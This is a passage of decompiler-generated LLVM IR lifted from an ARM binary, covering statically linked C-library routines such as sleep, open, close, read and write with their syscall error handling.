bb28:                                             ; preds = %bb, %dec_label_pc_1dba0, %dec_label_pc_1db8c, %.thread
  %v0_1dbcc = phi i32 [ %v3_1db84, %dec_label_pc_1dba0 ], [ %v0_1dbc8.pre, %dec_label_pc_1db8c ], [ %v3_1db78, %bb ], [ %v2_1dbb4, %.thread ]
  store i32 %v0_1dbcc, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_1dbcc, -4095
  br i1 %tmp31, label %dec_label_pc_1dbf0, label %dec_label_pc_1dbd8

dec_label_pc_1dbd8:                               ; preds = %bb28
  %v0_1dbdc = call i32 @__aeabi_read_tp()
  %v3_1dbe0 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1dbe0 = sext i16 %v3_1dbe0 to i32
  %v0_1dbe4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1dbe4 = sub i32 0, %v0_1dbe4
  store i32 %v1_1dbe4, i32* %r2.global-to-local, align 4
  %v3_1dbe8 = add i32 %v4_1dbe0, %v0_1dbdc
  %v4_1dbe8 = inttoptr i32 %v3_1dbe8 to i32*
  store i32 %v1_1dbe4, i32* %v4_1dbe8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1dbf0

dec_label_pc_1dbf0:                               ; preds = %bb28, %dec_label_pc_1dbd8
  %v0_1dbf4 = phi i32 [ %v0_1dbcc, %bb28 ], [ -1, %dec_label_pc_1dbd8 ]
  %v3_1dbf0 = icmp eq i32 %v0_1dbf4, -1
  store i32 %v0_1dbf4, i32* %r5.global-to-local, align 4
  br i1 %v3_1dbf0, label %dec_label_pc_1dbfc, label %dec_label_pc_1dc44

dec_label_pc_1dbfc:                               ; preds = %dec_label_pc_1dbf0
  %v0_1dc00 = call i32 @__aeabi_read_tp()
  store i32 %v0_1dc00, i32* %r0.global-to-local, align 4
  %v3_1dc04 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1dc04 = sext i16 %v3_1dc04 to i32
  %v2_1dc08 = add i32 %v4_1dc04, %v0_1dc00
  %v3_1dc08 = inttoptr i32 %v2_1dc08 to i32*
  %v4_1dc08 = load i32, i32* %v3_1dc08, align 4
  %v7_1dc0c = icmp eq i32 %v4_1dc08, 38
  br i1 %v7_1dc0c, label %dec_label_pc_1dc18, label %dec_label_pc_1dbfc.dec_label_pc_1dc44_crit_edge

dec_label_pc_1dbfc.dec_label_pc_1dc44_crit_edge:  ; preds = %dec_label_pc_1dbfc
  %v0_1dc44.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1dc44

dec_label_pc_1dc18:                               ; preds = %dec_label_pc_1dbfc
  %v0_1dc18 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1dc18, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_1dc18, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_1dc18
  %v5_1dc30 = sub i32 0, %v0_1dc18
  store i32 %v5_1dc30, i32* %r2.global-to-local, align 4
  %v7_1dc34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1dc3c.593 to i32), i32 58412) to i32*), align 4
  %v4_1dc38 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_1dc38, i32* %r0.global-to-local, align 4
  %v7_1dc3c = add i32 %v7_1dc34, %v0_1dc00
  %v8_1dc3c = inttoptr i32 %v7_1dc3c to i32*
  store i32 %v5_1dc30, i32* %v8_1dc3c, align 4
  %v0_1dc40.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_1dc18, %bb29
  %v0_1dc40 = phi i32 [ %v0_1dc40.pre, %bb29 ], [ %v0_1dc18, %dec_label_pc_1dc18 ]
  store i32 %v0_1dc40, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1dc44

dec_label_pc_1dc44:                               ; preds = %dec_label_pc_1dbfc.dec_label_pc_1dc44_crit_edge, %dec_label_pc_1dbf0, %.thread22
  %v0_1dc44 = phi i32 [ %v0_1dc44.pre, %dec_label_pc_1dbfc.dec_label_pc_1dc44_crit_edge ], [ %v0_1dbf4, %dec_label_pc_1dbf0 ], [ %v0_1dc40, %.thread22 ]
  store i32 %v0_1dc44, i32* %r0.global-to-local, align 4
  %v2_1dc48 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1dc48, i32* @r4, align 4
  ret i32 %v0_1dc44

; uselistorder directives
  uselistorder i32 %v0_1dc44, { 1, 0 }
  uselistorder i32 %v0_1dc18, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1dbcc, { 2, 0, 1 }
  uselistorder i32 %v3_1db84, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_1dc44, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_1dbf0, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_1dc5c = load i32, i32* @r4, align 4
  %v6_1dc5c = load i32, i32* @r5, align 4
  %v9_1dc5c = load i32, i32* @r6, align 4
  %v12_1dc5c = load i32, i32* @r7, align 4
  %v15_1dc5c = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1dc6c = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_1dc6c, label %dec_label_pc_1dc80, label %dec_label_pc_1dcf4

dec_label_pc_1dc80:                               ; preds = %entry
  %v0_1dc80 = call i32 @__aeabi_read_tp()
  %v1_1dc84 = add i32 %v0_1dc80, -1036
  %v2_1dc84 = inttoptr i32 %v1_1dc84 to i32*
  %v3_1dc84 = load i32, i32* %v2_1dc84, align 4
  %v1_1dc88 = and i32 %v3_1dc84, -71
  %v2_1dc8c = icmp ugt i32 %v1_1dc88, 7
  store i1 %v2_1dc8c, i1* %cpsr_c.global-to-local, align 1
  %v7_1dc8c = icmp eq i32 %v1_1dc88, 8
  %v1_1dc90 = add i32 %v0_1dc80, -1168
  store i32 %v1_1dc90, i32* @r5, align 4
  br i1 %v7_1dc8c, label %dec_label_pc_1dc98, label %dec_label_pc_1dd6c

dec_label_pc_1dc98:                               ; preds = %dec_label_pc_1dc80
  %v2_1dc9c = add i32 %v0_1dc80, -624
  %v3_1dc9c = inttoptr i32 %v2_1dc9c to i32*
  store i32 -1, i32* %v3_1dc9c, align 4
  %v0_1dca0 = load i32, i32* @r5, align 4
  %v1_1dca0 = add i32 %v0_1dca0, 132
  store i32 %v1_1dca0, i32* @r6, align 4
  br label %dec_label_pc_1dca4

dec_label_pc_1dca4:                               ; preds = %dec_label_pc_1dcd8.dec_label_pc_1dca4_crit_edge, %dec_label_pc_1dc98
  %v0_1dca8 = phi i32 [ %v0_1dca8.pre, %dec_label_pc_1dcd8.dec_label_pc_1dca4_crit_edge ], [ %v1_1dca0, %dec_label_pc_1dc98 ]
  %v0_1dca4 = phi i32 [ %v0_1dce0, %dec_label_pc_1dcd8.dec_label_pc_1dca4_crit_edge ], [ %v0_1dca0, %dec_label_pc_1dc98 ]
  %v1_1dca4 = add i32 %v0_1dca4, 132
  %v2_1dca4 = inttoptr i32 %v1_1dca4 to i32*
  %v3_1dca4 = load i32, i32* %v2_1dca4, align 4
  store i32 %v0_1dca8, i32* %r2.global-to-local, align 4
  store i32 %v3_1dca4, i32* @r4, align 4
  %v1_1dcb430 = inttoptr i32 %v0_1dca8 to i32*
  %v2_1dcb431 = load i32, i32* %v1_1dcb430, align 4
  %v3_1dcb833 = icmp uge i32 %v2_1dcb431, %v3_1dca4
  store i1 %v3_1dcb833, i1* %cpsr_c.global-to-local, align 1
  %v9_1dcb839 = icmp eq i32 %v2_1dcb431, %v3_1dca4
  br i1 %v9_1dcb839, label %dec_label_pc_1dcc0, label %dec_label_pc_1dcd8

dec_label_pc_1dcc0:                               ; preds = %dec_label_pc_1dca4, %dec_label_pc_1dcc0.dec_label_pc_1dcb4_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_1dcd0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1dcd0, label %dec_label_pc_1dcd4, label %dec_label_pc_1dcc0.dec_label_pc_1dcb4_crit_edge

dec_label_pc_1dcc0.dec_label_pc_1dcb4_crit_edge:  ; preds = %dec_label_pc_1dcc0
  %v0_1dcb4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1dcb8.pre = load i32, i32* @r4, align 4
  %v1_1dcb4 = inttoptr i32 %v0_1dcb4.pre to i32*
  %v2_1dcb4 = load i32, i32* %v1_1dcb4, align 4
  %v3_1dcb8 = icmp uge i32 %v2_1dcb4, %v1_1dcb8.pre
  store i1 %v3_1dcb8, i1* %cpsr_c.global-to-local, align 1
  %v9_1dcb8 = icmp eq i32 %v2_1dcb4, %v1_1dcb8.pre
  br i1 %v9_1dcb8, label %dec_label_pc_1dcc0, label %dec_label_pc_1dcd8

dec_label_pc_1dcd4:                               ; preds = %dec_label_pc_1dcc0
  %v0_1dcd4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1dcd8

dec_label_pc_1dcd8:                               ; preds = %dec_label_pc_1dca4, %dec_label_pc_1dcc0.dec_label_pc_1dcb4_crit_edge, %dec_label_pc_1dcd4
  %v0_1dcd8 = phi i32 [ %v0_1dcd4, %dec_label_pc_1dcd4 ], [ %v2_1dcb431, %dec_label_pc_1dca4 ], [ %v2_1dcb4, %dec_label_pc_1dcc0.dec_label_pc_1dcb4_crit_edge ]
  %v1_1dcd8 = phi i32 [ %v0_1dcd4, %dec_label_pc_1dcd4 ], [ %v3_1dca4, %dec_label_pc_1dca4 ], [ %v1_1dcb8.pre, %dec_label_pc_1dcc0.dec_label_pc_1dcb4_crit_edge ]
  %v3_1dcd8 = icmp uge i32 %v0_1dcd8, %v1_1dcd8
  store i1 %v3_1dcd8, i1* %cpsr_c.global-to-local, align 1
  %v9_1dcd8 = icmp eq i32 %v0_1dcd8, %v1_1dcd8
  br i1 %v9_1dcd8, label %dec_label_pc_1dce0, label %dec_label_pc_1dcd8.dec_label_pc_1dca4_crit_edge

dec_label_pc_1dcd8.dec_label_pc_1dca4_crit_edge:  ; preds = %dec_label_pc_1dcd8
  %v0_1dce0 = load i32, i32* @r5, align 4
  %v0_1dca8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1dca4

dec_label_pc_1dce0:                               ; preds = %dec_label_pc_1dcd8
  %v0_1dce8 = load i32, i32* @r7, align 4
  %v2_1dce8 = add i32 %v0_1dce8, 116
  %v3_1dce8 = inttoptr i32 %v2_1dce8 to i32*
  %v4_1dce8 = load i32, i32* %v3_1dce8, align 4
  store i32 122100, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1dce8)
  %v0_1dcfc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1dcf4

dec_label_pc_1dcf4:                               ; preds = %entry, %dec_label_pc_1dce0
  %v0_1dcfc = phi i32 [ 0, %entry ], [ %v0_1dcfc.pre, %dec_label_pc_1dce0 ]
  %v2_1dd00 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_1dd00, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_1dd0c = call i32 @__libc_sigaction(i32 17, i32 %v0_1dcfc, i32 %v2_1dd00)
  %v3_1dd10 = load i32, i32* %stack_var_-60, align 4
  %v2_1dd14 = icmp ne i32 %v3_1dd10, 0
  store i1 %v2_1dd14, i1* %cpsr_c.global-to-local, align 1
  %v7_1dd14 = icmp eq i32 %v3_1dd10, 1
  br i1 %v7_1dd14, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1dcf4
  %v3_1dd18 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_1dd18, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1dcf4, %bb
  call void @__pseudo_cond_branch(i1 %v7_1dd14, i32 ptrtoint (i32* @global_var_1a754.597 to i32))
  %v2_1dd28 = ptrtoint i32* %stack_var_-32 to i32
  %v2_1dd30 = call i32 @__libc_nanosleep(i32 %v2_1dd28, i32 %v2_1dd28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1dd34 = icmp eq i32 %v2_1dd30, 0
  br i1 %v2_1dd34, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_1dd48 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_1dd48, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_1dd58 = load i32, i32* %stack_var_-40, align 4
  %v1_1dd5c = and i32 %v3_1dd58, 65536
  store i32 %v1_1dd5c, i32* %r2.global-to-local, align 4
  %v2_1dd5c = icmp eq i32 %v1_1dd5c, 0
  br i1 %v2_1dd5c, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_1dd64 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_1dd64, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_1dd5c, i32 ptrtoint (i32* @global_var_1a754.597 to i32))
  br label %dec_label_pc_1dd6c

dec_label_pc_1dd6c:                               ; preds = %dec_label_pc_1dc80, %.thread5
  %v0_1dd6c = load i32, i32* @r4, align 4
  store i32 %v3_1dc5c, i32* @r4, align 4
  store i32 %v6_1dc5c, i32* @r5, align 4
  store i32 %v9_1dc5c, i32* @r6, align 4
  store i32 %v12_1dc5c, i32* @r7, align 4
  store i32 %v15_1dc5c, i32* @lr, align 4
  ret i32 %v0_1dd6c

; uselistorder directives
  uselistorder i32 %v0_1dcd4, { 1, 0 }
  uselistorder i32 %v1_1dcb8.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 6, 7, 8, 2, 1, 0, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1dd6c, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1dcf4, { 1, 0 }
  uselistorder label %dec_label_pc_1dcd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1dcc0, { 1, 0 }
}

define i32 @function_1dd80(i32 %arg1) local_unnamed_addr {
dec_label_pc_1dd80:
  %v0_1dd80 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1dd80, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_1dd80
  %v2_1dd80 = load i32, i32* @r4, align 4
  %v4_1dd80 = lshr i32 %v2_1dd80, %arg1
  %v5_1dd80 = sub i32 32, %arg1
  %v6_1dd80 = shl i32 %v2_1dd80, %v5_1dd80
  %v7_1dd80 = or i32 %v6_1dd80, %v4_1dd80
  %v9_1dd80 = and i32 %v7_1dd80, %arg1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_1dd80, %bb
  %v0_1dd84 = phi i32 [ %arg1, %dec_label_pc_1dd80 ], [ %v9_1dd80, %bb ]
  ret i32 %v0_1dd84

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_1dda4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_1dda4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_1dda4 = load i32, i32* @r0, align 4
  ret i32 %v2_1dda4

bb1:                                              ; preds = %entry
  %v0_1dda8 = call i32 @__syscall_error()
  ret i32 %v0_1dda8
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1ddb4 = load i32, i32* @global_var_2f6c8.600, align 4
  %v2_1ddb8 = icmp eq i32 %v3_1ddb4, 0
  store i1 %v2_1ddb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ddb8, label %dec_label_pc_1ddc0, label %entry.dec_label_pc_1dddc_crit_edge

entry.dec_label_pc_1dddc_crit_edge:               ; preds = %entry
  %v3_1dddc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1dddc

dec_label_pc_1ddc0:                               ; preds = %entry
  %v0_1ddc0 = load i32, i32* @r7, align 4
  store i32 %v0_1ddc0, i32* @ip, align 4
  %v0_1ddd0 = load i32, i32* @r0, align 4
  %v2_1ddd0 = icmp ugt i32 %v0_1ddd0, -4097
  %v7_1ddd0 = icmp eq i32 %v0_1ddd0, -4096
  store i1 %v7_1ddd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ddd0, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_1dddc, %bb8, %bb9, %dec_label_pc_1ddc0
  %merge2 = phi i32 [ %v0_1ddd0, %dec_label_pc_1ddc0 ], [ %v0_1de00, %dec_label_pc_1dddc ], [ %v0_1de10, %bb8 ], [ %v0_1de10, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_1ddc0
  %v0_1ddd8 = call i32 @__syscall_error()
  br label %dec_label_pc_1dddc

dec_label_pc_1dddc:                               ; preds = %entry.dec_label_pc_1dddc_crit_edge, %bb7
  %v3_1dddc = phi i32 [ %v3_1dddc.pre, %entry.dec_label_pc_1dddc_crit_edge ], [ %v0_1ddd8, %bb7 ]
  %v9_1dddc = load i32, i32* @r7, align 4
  store i32 %v9_1dddc, i32* %stack_var_-8, align 4
  %v12_1dddc = load i32, i32* @lr, align 4
  %v0_1dde0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1dde0, i32* @ip, align 4
  store i32 %v3_1dddc, i32* @r7, align 4
  %v1_1ddfc = call i32 @__libc_disable_asynccancel(i32 %v0_1dde0)
  %v0_1de00 = load i32, i32* @r7, align 4
  store i32 %v0_1de00, i32* @r0, align 4
  %v2_1de04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1de04, i32* @r7, align 4
  store i32 %v12_1dddc, i32* @lr, align 4
  %v2_1de08 = icmp ugt i32 %v0_1de00, -4097
  %v7_1de08 = icmp eq i32 %v0_1de00, -4096
  store i1 %v7_1de08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1de08, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_1dddc
  %v0_1de10 = call i32 @__syscall_error()
  %v0_1de20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1de20, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_1de20 = load i32, i32* @r1, align 4
  %v2_1de20 = load i32, i32* @ip, align 4
  %v3_1de20 = load i32, i32* @r8, align 4
  %v4_1de20 = lshr i32 %v2_1de20, %v3_1de20
  %v5_1de20 = sub i32 32, %v3_1de20
  %v6_1de20 = shl i32 %v2_1de20, %v5_1de20
  %v7_1de20 = or i32 %v6_1de20, %v4_1de20
  %v9_1de20 = and i32 %v7_1de20, %v1_1de20
  store i32 %v9_1de20, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_1de10, { 1, 0 }
  uselistorder i32 %v0_1de00, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1ddd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1dddc, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_1de34 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_1de34, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_1de34 = load i32, i32* @r0, align 4
  ret i32 %v2_1de34

bb1:                                              ; preds = %entry
  %v0_1de38 = call i32 @__syscall_error()
  ret i32 %v0_1de38
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1de44 = load i32, i32* @global_var_2f6c8.600, align 4
  store i32 %v3_1de44, i32* %ip.global-to-local, align 4
  %v2_1de48 = icmp eq i32 %v3_1de44, 0
  store i1 %v2_1de48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1de48, label %dec_label_pc_1de50, label %entry.dec_label_pc_1de6c_crit_edge

entry.dec_label_pc_1de6c_crit_edge:               ; preds = %entry
  %v3_1de6c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1de6c

dec_label_pc_1de50:                               ; preds = %entry
  %v0_1de50 = load i32, i32* @r7, align 4
  store i32 %v0_1de50, i32* %ip.global-to-local, align 4
  %v0_1de60 = load i32, i32* @r0, align 4
  %v2_1de60 = icmp ugt i32 %v0_1de60, -4097
  %v7_1de60 = icmp eq i32 %v0_1de60, -4096
  store i1 %v7_1de60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1de60, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_1de6c, %bb10, %bb11, %dec_label_pc_1de50
  %merge2 = phi i32 [ %v0_1de60, %dec_label_pc_1de50 ], [ %v0_1de90, %dec_label_pc_1de6c ], [ %v0_1dea0, %bb10 ], [ %v0_1dea0, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_1de50
  %v0_1de68 = call i32 @__syscall_error()
  br label %dec_label_pc_1de6c

dec_label_pc_1de6c:                               ; preds = %entry.dec_label_pc_1de6c_crit_edge, %bb9
  %v3_1de6c = phi i32 [ %v3_1de6c.pre, %entry.dec_label_pc_1de6c_crit_edge ], [ %v0_1de68, %bb9 ]
  store i32 %v3_1de6c, i32* %stack_var_-24, align 4
  %v9_1de6c = load i32, i32* @r2, align 4
  %v12_1de6c = load i32, i32* @r3, align 4
  %v15_1de6c = load i32, i32* @r7, align 4
  store i32 %v15_1de6c, i32* %stack_var_-8, align 4
  %v18_1de6c = load i32, i32* @lr, align 4
  %v0_1de70 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1de70, i32* %ip.global-to-local, align 4
  %v2_1de78 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_1de6c, i32* @r2, align 4
  store i32 %v12_1de6c, i32* @r3, align 4
  store i32 %v2_1de78, i32* @r7, align 4
  %v1_1de8c = call i32 @__libc_disable_asynccancel(i32 %v0_1de70)
  %v0_1de90 = load i32, i32* @r7, align 4
  store i32 %v0_1de90, i32* @r0, align 4
  %v2_1de94 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1de94, i32* @r7, align 4
  store i32 %v18_1de6c, i32* @lr, align 4
  %v2_1de98 = icmp ugt i32 %v0_1de90, -4097
  %v7_1de98 = icmp eq i32 %v0_1de90, -4096
  store i1 %v7_1de98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1de98, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1de6c
  %v0_1dea0 = call i32 @__syscall_error()
  %v0_1deb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1deb0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_1deb0 = load i32, i32* @r1, align 4
  %v2_1deb0 = load i32, i32* %ip.global-to-local, align 4
  %v3_1deb0 = udiv i32 %v2_1deb0, 32768
  %v4_1deb0 = mul i32 %v2_1deb0, 131072
  %v5_1deb0 = or i32 %v3_1deb0, %v4_1deb0
  %v8_1deb0 = and i32 %v5_1deb0, %v1_1deb0
  store i32 %v8_1deb0, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_1dea0, { 1, 0 }
  uselistorder i32 %v0_1de90, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1de60, { 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1de6c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_1dec4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_1dec4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_1dec4 = load i32, i32* @r0, align 4
  ret i32 %v2_1dec4

bb1:                                              ; preds = %entry
  %v0_1dec8 = call i32 @__syscall_error()
  ret i32 %v0_1dec8
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1ded4 = load i32, i32* @global_var_2f6c8.600, align 4
  %v2_1ded8 = icmp eq i32 %v3_1ded4, 0
  store i1 %v2_1ded8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ded8, label %dec_label_pc_1dee0, label %entry.dec_label_pc_1defc_crit_edge

entry.dec_label_pc_1defc_crit_edge:               ; preds = %entry
  %v3_1defc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1defc

dec_label_pc_1dee0:                               ; preds = %entry
  %v0_1def0 = load i32, i32* @r0, align 4
  %v2_1def0 = icmp ugt i32 %v0_1def0, -4097
  %v7_1def0 = icmp eq i32 %v0_1def0, -4096
  store i1 %v7_1def0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1def0, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_1defc, %bb10, %bb11, %dec_label_pc_1dee0
  %merge2 = phi i32 [ %v0_1def0, %dec_label_pc_1dee0 ], [ %v0_1df20, %dec_label_pc_1defc ], [ %v0_1df30, %bb10 ], [ %v0_1df30, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_1dee0
  %v0_1def8 = call i32 @__syscall_error()
  br label %dec_label_pc_1defc

dec_label_pc_1defc:                               ; preds = %entry.dec_label_pc_1defc_crit_edge, %bb9
  %v3_1defc = phi i32 [ %v3_1defc.pre, %entry.dec_label_pc_1defc_crit_edge ], [ %v0_1def8, %bb9 ]
  %v12_1defc = load i32, i32* @r3, align 4
  %v15_1defc = load i32, i32* @r7, align 4
  store i32 %v15_1defc, i32* %stack_var_-8, align 4
  %v18_1defc = load i32, i32* @lr, align 4
  %v0_1df00 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_1defc, i32* @r3, align 4
  store i32 %v3_1defc, i32* @r7, align 4
  %v1_1df1c = call i32 @__libc_disable_asynccancel(i32 %v0_1df00)
  %v0_1df20 = load i32, i32* @r7, align 4
  store i32 %v0_1df20, i32* @r0, align 4
  %v2_1df24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1df24, i32* @r7, align 4
  store i32 %v18_1defc, i32* @lr, align 4
  %v2_1df28 = icmp ugt i32 %v0_1df20, -4097
  %v7_1df28 = icmp eq i32 %v0_1df20, -4096
  store i1 %v7_1df28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1df28, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1defc
  %v0_1df30 = call i32 @__syscall_error()
  %v0_1df40 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1df40, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_1df30, { 1, 0 }
  uselistorder i32 %v0_1df20, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1def0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1defc, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_1df54 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_1df54, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_1df54 = load i32, i32* @r0, align 4
  ret i32 %v2_1df54

bb1:                                              ; preds = %entry
  %v0_1df58 = call i32 @__syscall_error()
  ret i32 %v0_1df58

; uselistorder directives
  uselistorder i1* @cpsr_c, { 2, 3, 4, 5, 0, 1 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1df64 = load i32, i32* @global_var_2f6c8.600, align 4
  %v2_1df68 = icmp eq i32 %v3_1df64, 0
